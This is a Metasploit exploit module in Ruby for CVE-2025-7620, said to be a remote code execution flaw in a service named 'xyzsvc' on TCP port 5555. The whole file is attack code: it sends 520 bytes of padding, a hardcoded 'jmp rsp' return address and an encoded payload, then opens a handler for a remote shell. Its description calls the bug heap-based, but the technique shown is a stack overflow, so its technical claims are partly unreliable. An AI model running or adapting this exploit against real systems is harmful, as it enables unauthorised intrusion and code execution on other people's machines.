# CVE-2025-7620 Metasploit Module (Remote Code Execution)

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'CVE-2025-7620 xyzsvc Remote Code Execution',
      'Description' => %q{
        This module exploits a heap-based buffer overflow in xyzsvc on TCP port 5555.
        By sending a crafted payload, it is possible to execute arbitrary code remotely.
      },
      'Author' => ['YURI08'],
      'License' => MSF_LICENSE,
      'References' => [['CVE', '2025-7620']],
      'Payload' => {
        'Space' => 1024,
        'BadChars' => "\x00"
      },
      'Platform' => 'linux',
      'Arch' => ARCH_X64,
      'Targets' => [
        ['Automatic', {}]
      ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Jul 14 2025'
    ))

    register_options(
      [
        Opt::RPORT(5555)
      ]
    )
  end

  def exploit
    connect

    offset = 520
    ret_addr = [0x00000000004011a3].pack('Q<') # jmp rsp

    print_status("Sending exploit payload...")
    payload_full = "A" * offset + ret_addr + payload.encoded

    sock.put(payload_full + "\n")
    handler

    disconnect
  end
end
